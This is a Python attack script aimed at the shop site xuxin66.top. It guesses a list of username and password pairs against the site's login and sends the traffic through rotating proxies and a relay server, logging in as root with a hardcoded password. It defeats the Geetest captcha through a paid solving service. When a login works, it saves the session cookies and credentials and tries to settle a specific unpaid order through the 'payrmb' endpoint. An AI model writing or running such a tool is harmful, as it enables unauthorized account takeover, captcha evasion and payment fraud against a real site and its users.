#!/usr/bin/env python3
"""Login xuxin66 via JP+QG with 2Captcha Geetest (success-case pattern)."""
import json, os, re, subprocess, time
from pathlib import Path

JP, JP_PASS = "124.248.67.170", "UzHlZQDUy7XP"
BASE = "https://xuxin66.top/shop"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36"
OUT = Path("/data/automation/results/xuxin66.top/login_2captcha")
OUT.mkdir(parents=True, exist_ok=True)
CK = "/tmp/xuxin66_login_ck.txt"

CREDS = [
    ("datou111", "datou333"), ("datou111", "datou111"), ("datou333", "datou111"),
    ("datou333", "datou333"), ("xuxin66", "datou111"), ("xuxin66", "xuxin66"),
    ("xuxin66", "123456"), ("admin", "datou111"), ("admin", "admin"),
    ("admin", "123456"), ("xuxin", "datou111"), ("xuxin", "xuxin66"),
    ("test", "123456"), ("user", "123456"), ("faka", "123456"),
]


def qg():
    subprocess.run(["/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True, timeout=30)
    env = open("/data/config/proxy.env").read()
    subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP}",
         "mkdir -p /data/config /data/tmp; cat > /data/config/proxy.env"],
        input=env.encode(), capture_output=True, timeout=20,
    )


def jp(cmd, t=120):
    r = subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no",
         "-o", "ConnectTimeout=15", f"root@{JP}", cmd],
        capture_output=True, timeout=t,
    )
    return (r.stdout or b"").decode("utf-8", "replace")


def log(m):
    print(m, flush=True)
    open(OUT / "login.log", "a").write(m + "\n")


def bootstrap_captcha():
    out = jp(f"""source /data/config/proxy.env
UA='{UA}'; BASE='{BASE}'; CK={CK}
rm -f $CK
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 25 -A "$UA" "$BASE/user/login.php" -o /tmp/login.html
python3 -c "import re;h=open('/tmp/login.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\\s*=\\s*\\\"([a-f0-9]+)\\\"',h);print('CSRF='+(m.group(1) if m else ''))"
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 15 -A "$UA" -e "$BASE/user/login.php" \
  -H "X-Requested-With: XMLHttpRequest" "$BASE/ajax.php?act=captcha&t=$(date +%s)"
echo
""")
    return out


def solve(cap: dict):
    import sys
    sys.path.insert(0, "/data/recon/cookie_tool/rev")
    from geetest_2captcha import solve_geetest_v3
    return solve_geetest_v3(
        gt=cap["gt"],
        challenge=cap["challenge"],
        pageurl=f"{BASE}/user/login.php",
        api_server=cap.get("api_server"),
    )


def try_login(user, password, csrf, geetest):
    # pass geetest fields via env-safe base64 json
    payload = {
        "user": user,
        "pass": password,
        "csrf_token": csrf,
        **geetest,
    }
    open("/tmp/xux_login_payload.json", "w").write(json.dumps(payload, ensure_ascii=False))
    subprocess.run(
        ["sshpass", "-p", JP_PASS, "scp", "-o", "StrictHostKeyChecking=no",
         "/tmp/xux_login_payload.json", f"root@{JP}:/tmp/xux_login_payload.json"],
        capture_output=True, timeout=30,
    )
    out = jp(f"""source /data/config/proxy.env
UA='{UA}'; BASE='{BASE}'; CK={CK}
python3 - <<'PY'
import json,urllib.parse,subprocess
p=json.load(open('/tmp/xux_login_payload.json'))
data=urllib.parse.urlencode(p)
open('/tmp/xux_login_body.txt','w').write(data)
print('fields', list(p))
PY
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 25 -A "$UA" -e "$BASE/user/login.php" \
  -H "X-Requested-With: XMLHttpRequest" -H "Content-Type: application/x-www-form-urlencoded" \
  -X POST --data-binary @/tmp/xux_login_body.txt \
  "$BASE/user/ajax.php?act=login"
echo
# check session
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 15 -A "$UA" -H "X-Requested-With: XMLHttpRequest" \
  "$BASE/ajax.php?act=checklogin"; echo
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 15 -A "$UA" "$BASE/user/" -o /tmp/user.html -w 'USER=%{{http_code}}:%{{size_download}}\n'
grep -oE '余额|rmb|userid|退出|充值|￥[0-9.]+' /tmp/user.html | head -20
""")
    return out


def main():
    # load 2captcha key
    for line in open("/data/recon/cookie_tool/config/2captcha.env"):
        if line.startswith("TWOCAPTCHA_API_KEY="):
            os.environ["TWOCAPTCHA_API_KEY"] = line.split("=", 1)[1].strip()
    log(f"OUT={OUT}")
    for user, password in CREDS:
        qg()
        log(f"try {user}:{password}")
        boot = bootstrap_captcha()
        (OUT / f"boot_{user}.txt").write_text(boot)
        csrf_m = re.search(r"CSRF=([a-f0-9]+)", boot)
        csrf = csrf_m.group(1) if csrf_m else ""
        cap = None
        for line in boot.splitlines():
            line = line.strip()
            if line.startswith("{") and "gt" in line:
                try:
                    cap = json.loads(line)
                except Exception:
                    pass
        if not cap or not cap.get("gt"):
            log(f"no captcha: {boot[-200:]}")
            continue
        log(f"captcha gt={cap.get('gt')[:16]} challenge={str(cap.get('challenge'))[:16]}")
        try:
            geetest = solve(cap)
            log(f"solved keys={list(geetest)}")
        except Exception as e:
            log(f"solve fail: {e}")
            continue
        out = try_login(user, password, csrf, geetest)
        (OUT / f"login_{user}_{password}.txt").write_text(out)
        log(out[:500])
        if '"code":1' in out or "退出" in out or re.search(r'"code"\s*:\s*1', out):
            log(f"LOGIN_OK {user}:{password}")
            # pull cookie
            ck = jp(f"cat {CK}")
            (OUT / "cookies.txt").write_text(ck)
            (OUT / " creds_ok.txt").write_text(f"{user}:{password}\n")
            # try payrmb on known unpaid trade
            trade = "20260803075904880"
            pay = jp(f"""source /data/config/proxy.env
UA='{UA}'; BASE='{BASE}'; CK={CK}
CSRF=$(python3 -c "import re;h=open('/tmp/user.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\\s*=\\s*\\\"([a-f0-9]+)\\\"',h);print(m.group(1) if m else '')")
r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 15 -A "$UA" -e "$BASE/?mod=order&orderid={trade}" \
 -H "X-Requested-With: XMLHttpRequest" -X POST \
 --data-urlencode "orderid={trade}" --data-urlencode "csrf_token=$CSRF" "$BASE/ajax.php?act=payrmb")
echo PAYRMB=$r
echo GS=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 10 -A "$UA" "$BASE/other/getshop.php?trade_no={trade}")
""")
            (OUT / "payrmb.txt").write_text(pay)
            log(pay)
            return 0
        if "用户名或密码不正确" in out or "密码错误" in out:
            continue
        # code -1 wrong pass etc - continue
        time.sleep(1)
    log("NO_LOGIN")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
